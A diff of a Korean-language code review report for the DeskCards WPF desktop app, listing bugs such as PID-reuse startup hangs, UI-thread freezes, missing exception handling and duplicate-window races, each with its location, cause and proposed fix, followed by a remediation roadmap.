-- **권장 수정 방안**:
-  - 파일 삭제 루프에 `version.txt`를 추가하거나, 설정 보존 여부에 따라 설치 디렉터리를 완전히 정리하도록 수정해야 합니다.
-
----
-
-### 08. `App.WaitForUpdatedFrom` PID 재활용 시 15초 기동 지연
-- **코드 위치**: `src/DeskCards/App.xaml.cs:123-125`
-- **유효성 판정**: **100% 확실 (Valid & Reproducible)**
-- **발생 상황 (Trigger Scenario)**:
-  - DeskCards가 업데이트를 적용하고 새 프로세스를 실행할 때 `--updated-from <구버전PID>` 인자를 넘깁니다.
-  - 구버전 프로세스가 종료된 직후, Windows OS 커널이 해당 PID를 백그라운드 시스템 서비스(svchost 등)나 사용자의 다른 장기 실행 프로세스에 즉시 재할당(Recycle)했을 때 발생합니다.
-- **내부 발생 메커니즘 (Mechanism)**:
-  1. `App.WaitForUpdatedFrom`은 전달받은 PID로 프로세스를 조회하고 종료를 기다립니다:
-     ```csharp
-     using var old = Process.GetProcessById(pid);
-     old.WaitForExit(15000);
-     ```
-  2. 대상 프로세스가 실제로 `DeskCards`인지 확인하는 `old.ProcessName == "DeskCards"` 검사가 전혀 없습니다.
-  3. 만약 해당 PID가 다른 살아있는 시스템 프로세스에 할당되었다면, 그 프로세스는 당연히 15초 안에 종료되지 않으므로 DeskCards 메인 UI 스레드는 **정확히 15,000ms(15초) 동안 아무 화면도 띄우지 못하고 멈춥니다(Hang).**
-- **실제 영향**:
-  - 업데이트 후 앱이 다시 켜질 때 15초 동안 마우스 커서가 멈추거나 앱이 반응하지 않아 사용자가 프로세스가 먹통이 되었다고 판단하여 강제 종료하게 만듭니다.
-- **권장 수정 방안**:
-  - `old.ProcessName.Equals("DeskCards", StringComparison.OrdinalIgnoreCase)` 검사를 추가하여, 이름이 일치하지 않으면 기다리지 않고 즉시 건너뛰도록 처리해야 합니다.
-
----
-
-## 4. [Low] 성능 저하 및 운영 안정성
-
-### 09. `GroupModel.Reload` 시 UI 스레드 동기 Shell I/O 프리징
-- **코드 위치**: `src/DeskCards/ShellIcons.cs:55`, `src/DeskCards/GroupModel.cs:88`
-- **유효성 판정**: **100% 확실 (Valid & Reproducible)**
-- **발생 상황 (Trigger Scenario)**:
-  - 그룹 폴더 안에 네트워크 드라이브(UNC 경로 `\\nas\share\...`)의 파일이나 바로가기(`.lnk`)가 들어 있는 상태에서, NAS 전원이 꺼져 있거나 오프라인 네트워크 환경일 때 앱을 시작하거나 그룹을 새로고침할 때.
-- **내부 발생 메커니즘 (Mechanism)**:
-  - `ShellIcons.Get()`은 Windows 셸 API인 `SHCreateItemFromParsingName`을 호출하여 아이콘을 가져옵니다.
-  - 이 호출이 WPF UI 메인 스레드에서 동기적으로 일어납니다. 오프라인 네트워크 경로에 대해 Windows Shell API는 TCP SYN 타임아웃(기본 20~30초) 동안 블로킹됩니다.
-- **실제 영향**:
-  - 앱 기동 시 또는 폴더 감시 이벤트 발생 시 UI 스레드가 수십 초 동안 멈추며 바탕화면의 모든 카드가 '응답 없음' 상태가 됩니다.
-- **권장 수정 방안**:
-  - 셸 아이콘 추출 작업을 백그라운드 작업(`Task.Run`)으로 분리하고, UI에는 기본 폴더/파일 아이콘을 먼저 표시한 뒤 비동기로 교체해야 합니다.
-
----
-
-### 10. `EdgeBar` 40ms 무한 폴링으로 인한 CPU 유휴 상태 방해
-- **코드 위치**: `src/DeskCards/EdgeBar.cs:42-45`
-- **유효성 판정**: **100% 확실 (Valid & Reproducible)**
-- **발생 상황 (Trigger Scenario)**:
-  - 노트북 배터리 전원으로 사용 중이며, 마우스를 전혀 움직이지 않고 유휴 상태로 데스크톱을 방치할 때.
-- **내부 발생 메커니즘 (Mechanism)**:
-  - `EdgeBar`는 40ms 간격의 `DispatcherTimer`를 상시 구동하며 1초에 25번씩 UI 스레드를 깨워 마우스 좌표(`GetCursorPos`)와 화면 경계를 계산합니다.
-- **실제 영향**:
-  - CPU 코어가 저전력 유휴 상태(Deep Sleep / C-State)로 완전히 내려가지 못하고 지속적으로 깨어나 노트북 배터리 수명을 갉아먹습니다.
-- **권장 수정 방안**:
-  - 마우스가 비활성 상태일 때는 타이머 주기를 늘리거나(200~300ms), 윈도우 마우스 훅 또는 화면 진입 감지 이벤트 방식으로 개선할 수 있습니다.
-
----
-
-### 11. 주요 비동기 진입점들의 `async void` 사용
+### 08. [코드 정리] 리팩토링 잔여 고아 요약 주석(Orphan Docstrings) 방치
 - **코드 위치**:
-  - `src/DeskCards/GroupManager.Dards.cs:230` (`MoveDardStorage`)
-  - `src/DeskCards/GroupManager.Dards.cs:433` (`DeleteDardStorage`)
-  - `src/DeskCards/GroupManager.DardIssues.cs:108` (`MeasureDardUsage`)
-- **유효성 판정**: **100% 확실 (Valid & Reproducible)**
-- **발생 상황 (Trigger Scenario)**:
-  - 카드 저장소 이전 또는 용량 측정 비동기 작업 도중 디스크 꽉 참, 파일 잠금, 권한 부족 등의 I/O 예외가 발생할 때.
-- **내부 발생 메커니즘 (Mechanism)**:
-  - C#에서 `async void` 메서드는 반환할 `Task`가 없어 예외가 호출자로 전달되지 않고 `SynchronizationContext`를 통해 런타임의 최상위 미처리 예외로 직행합니다.
-- **실제 영향**:
-  - 백그라운드 정리나 용량 측정 도중 사소한 파일 I/O 오류가 하나만 발생해도 프로세스 전체가 비정상 강제 종료됩니다.
-- **권장 수정 방안**:
-  - 모든 비동기 메서드를 `async Task`로 전환하고, 호출부에서 적절한 예외 처리를 수행해야 합니다.
+  - `src/DeskCards/Config.cs:202-204`
+  - `src/DeskCards/GroupManager.cs:33-35, 91-93`
+- **문제점 분석**:
+  - 과거 코드 수정 및 파일 분할 과정에서 메서드가 삭제되거나 이동하면서 주석만 엉뚱한 위치에 남겨진 곳들이 있습니다:
+    1. `Config.cs:202`: `/// <summary>.dard 한 종류...의 승인.</summary>` 주석이 `DardApproval`이 아닌 `BarItem` 클래스 바로 위에 붙어 있음.
+    2. `GroupManager.cs:33-34`: `AllCards` 프로퍼티 바로 위에 완전히 다른 내용의 summary 주석 2개가 겹쳐서 적혀 있음.
+    3. `GroupManager.cs:91`: 삭제된 `RefreshPlacement` 관련 설명 주석이 엉뚱하게 `TipHidden(string id)` 메서드 위에 방치되어 있음.
+- **개선 방안**:
+  - 고아 주석들을 삭제하거나 올바른 대상 위치로 재배치하여 코드 가독성과 IDE IntelliSense 정확도를 확보합니다.
 
 ---
 
-### 12. 탐색기 재시작 시 N개 카드의 중복 `Reconcile` 호출
-- **코드 위치**: `src/DeskCards/GroupManager.cs:541-551`
-- **유효성 판정**: **100% 확실 (Valid & Reproducible)**
-- **발생 상황 (Trigger Scenario)**:
-  - Windows 탐색기(`explorer.exe`)가 비정상 종료 후 재시작되거나 사용자가 작업 관리자에서 탐색기를 재시작했을 때.
-- **내부 발생 메커니즘 (Mechanism)**:
-  - 바탕화면에 N개의 카드가 떠 있는 상태에서 부모 윈도우(`Progman`)가 파괴되면, N개 카드의 `OnCardClosed`가 동시에 실행되며 각각 1.5초 지연 타이머를 생성하여 등록합니다.
-  - 카드가 중복 생성되지는 않으나, 1.5초 뒤 N번의 디스크 스캔 및 카드 동기화(`Reconcile`)가 연속으로 호출됩니다.
-- **실제 영향**:
-  - 탐색기 복구 시점에 불필요한 중복 디스크 I/O와 CPU 스파이크가 발생합니다.
-- **권장 수정 방안**:
-  - `GroupManager` 수준에서 단일 디바운스(Debounce) 타이머로 통합 관리해야 합니다.
+### 09. [UI 동시성] `ExpandedWindow` 설정 버튼 연속 클릭 시 중복 창 생성 위험
+- **코드 위치**: `src/DeskCards/ExpandedWindow.xaml.cs:64-68`
+- **문제점 분석**:
+  ```csharp
+  GearButton.Click += (_, _) =>
+  {
+      Closed += (_, _) => Dispatcher.BeginInvoke(DispatcherPriority.Background, () => SettingsWindow.Open(_mgr, _card));
+      SafeClose();
+  };
+  ```
+  `SafeClose()`로 창이 닫히는 비동기 과정 동안 사용자가 설정(톱니바퀴) 버튼을 빠르게 여러 번 클릭하면, `Closed` 이벤트에 핸들러가 누적 등록되어 창이 완전히 닫힌 후 `SettingsWindow.Open`이 여러 번 호출됩니다.
+- **개선 방안**:
+  - 버튼 클릭 즉시 `GearButton.IsEnabled = false`로 비활성화하거나 플래그를 두어 1회만 트리거되도록 가드합니다.
 
 ---
 
-## 5. 부록: 검증 결과 무해/오탐으로 판정된 항목
+### 10. [예외 처리] `DardPackage.Unzip`에서 `InvalidDataException` 외 스트림 예외 누락
+- **코드 위치**: `src/DeskCards/DardPackage.cs:243-247`
+- **문제점 분석**:
+  - `Unzip()`은 `InvalidDataException`만 잡아서 `DardException("zip 파일이 아니거나 손상됐어요.")`로 변환합니다.
+  - 지원되지 않는 Zip 압축 방식이나 손상된 스트림 읽기 시 발생하는 `NotSupportedException`, `IOException` 등은 잡히지 않고 외부로 원시 예외가 탈출합니다.
+- **개선 방안**:
+  - `catch (Exception ex) when (ex is InvalidDataException or NotSupportedException or IOException)` 형태로 묶어 사용자 친화적인 `DardException`으로 일관되게 감싸주어야 합니다.
 
-1. **`DeskCard`의 `HwndSource.RemoveHook` 누수 의심**:
-   - **판정: 무해 (False Positive)**
-   - WPF의 `Window.Close()`는 윈도우 파괴(`WM_NCDESTROY`) 시 `HwndSource.Dispose()`를 내부 호출하며, `HwndSource`가 자신의 훅 리스트를 스스로 초기화합니다. 따라서 메모리 누수가 발생하지 않습니다.
-2. **`Config.Save` 백그라운드 동시성 충돌 의심**:
-   - **판정: 무해 (False Positive)**
-   - 비동기 콜백들이 전부 WPF UI 스레드로 마샬링되어 순차 실행되므로 다중 스레드 동시 쓰기 충돌은 발생하지 않습니다.
-3. **`BalloonTip.Show` 및 `Path.GetTempFileName()` 고갈 의심**:
-   - **판정: 극히 희박 (Inconsequential)**
-   - 호출 빈도가 극히 낮고 임시 파일은 즉시 삭제되므로 65,536개 제한에 도달할 위험이 없습니다.
+---
+
+## 3. 권장 조치 로드맵 (Action Items)
+
+1. **단기 안정화 (Quick Wins)**:
+   - `GroupManager.cs` / `Config.cs`의 고아 주석 3곳 정리
+   - `EdgeBar.cs`의 `BarEnabled == false` 시 타이머 정지 처리
+   - `ExpandedWindow.xaml.cs` 설정 버튼 중복 클릭 방지
+2. **중기 아키텍처 개선 (Core Improvements)**:
+   - `GroupModel.cs`의 `Directory.Exists` 중복 호출 제거 및 파일 열거 백그라운드화
+   - `FileOps.MoveContentsAndDelete`에 볼륨 간 디렉터리 이동 폴백 추가
+   - `DardProxy.cs`에 웹 표준 포트 화이트리스트 필터링 추가
+3. **장기 보완 (Defensive Hardening)**:
+   - `ShellIcons.Async.cs`의 네트워크 경로 전용 격리 큐 도입 (Head-of-Line 방지)
+   - `DardScriptPolicy.cs`의 `<template>` 태그 재귀 탐색 지원
